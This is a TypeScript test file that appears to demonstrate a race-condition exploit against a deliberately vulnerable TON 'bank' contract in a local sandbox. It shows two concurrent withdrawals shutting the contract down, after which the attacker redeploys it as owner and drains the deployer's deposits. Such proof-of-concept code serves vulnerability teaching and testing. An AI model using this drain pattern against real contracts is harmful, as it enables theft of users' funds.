import { Blockchain, SandboxContract, Treasury, TreasuryContract } from '@ton/sandbox';
import { Address, Builder, Cell, Dictionary, fromNano, Slice, toNano } from '@ton/core';
import { RaceCondition } from '../wrappers/RaceCondition';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

describe('RaceCondition', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('RaceCondition');
    });

    let blockchain: Blockchain;
    let deployer: SandboxContract<TreasuryContract>;
    let attacker: SandboxContract<TreasuryContract>;
    let raceCondition: SandboxContract<RaceCondition>;

    beforeEach(async () => {
        blockchain = await Blockchain.create();

        const emptyDict = Dictionary.empty<bigint, bigint>(Dictionary.Keys.BigUint(256), {
            serialize: (src: bigint, builder: Builder) => {
                builder.storeCoins(src);
            },
            parse: (src: Slice) => {
                return src.loadCoins();
            },
        });

        raceCondition = blockchain.openContract(RaceCondition.createFromConfig({
            total_balance: 0n,
            accounts: emptyDict,
        }, code));

        deployer = await blockchain.treasury('deployer');
        attacker = await blockchain.treasury('attacker');

        await deployContract(deployer.getSender(), deployer.address);

        await raceCondition.sendDeposit(deployer.getSender(), toNano('10'));
    });

    const deployContract = async (sender: Treasury, senderAddress: Address) => {
        const deployResult = await raceCondition.sendDeploy(sender, toNano('0.05'));

        expect(deployResult.transactions).toHaveTransaction({
            from: senderAddress,
            to: raceCondition.address,
            deploy: true,
            success: true,
        });
    }

    const printUserBalance = async (user: string, address: Address) => {
        const addressHash = address.hash;
        const bigIntAddress = BigInt('0x' + Buffer.from(addressHash).toString('hex'));

        console.log(user, 'wallet balance ->', fromNano((await blockchain.getContract(address)).balance));
        console.log(user, 'balance in bank ->', fromNano(await raceCondition.getUserBalance(bigIntAddress)));
    };

    const printTotalBankBalance = async () => {
        console.log('Bank balance ->', fromNano(await raceCondition.getTotalBalance()));
    };

    it('Exploit Race Condition', async () => {
        await printTotalBankBalance();
        await printUserBalance('Deployer', deployer.address);
        await printUserBalance('Attacker', attacker.address);

        console.log('The attacker depoits some amount in the bank');
        await raceCondition.sendDeposit(attacker.getSender(), toNano('20'));
        await printTotalBankBalance();
        await printUserBalance('Attacker', attacker.address);


        console.log('Bank State ->', (await blockchain.getContract(raceCondition.address)).accountState?.type);
        console.log('Now the attacker sends 2 concurrent withdrawal of 10 coins each msgs causing the bank to shutdown');
        console.log('This is where the race condition happens!!!')
        raceCondition.sendWithdraw(attacker.getSender(), toNano('0.5'), toNano('10'));
        await raceCondition.sendWithdraw(attacker.getSender(), toNano('0.5'), toNano('10'));
        console.log('Bank State ->', (await blockchain.getContract(raceCondition.address)).accountState?.type);

        console.log('The attacker redeploys the bank contract as the owner');
        await deployContract(attacker.getSender(), attacker.address);
        await printTotalBankBalance();
        
        console.log('The attacker depoists a small amount of 1 coin in the bank');
        await raceCondition.sendDeposit(attacker.getSender(), toNano('1'));
        await printTotalBankBalance();

        console.log('Since it is the only user of the bank, the attacker withdraws all money which bank had reserved but doesn\'t have a record of');
        await raceCondition.sendWithdraw(attacker.getSender(), toNano('0.5'), toNano('1'));

        await printTotalBankBalance();
        await printUserBalance('Deployer', deployer.address);
        await printUserBalance('Attacker', attacker.address);
    });
});
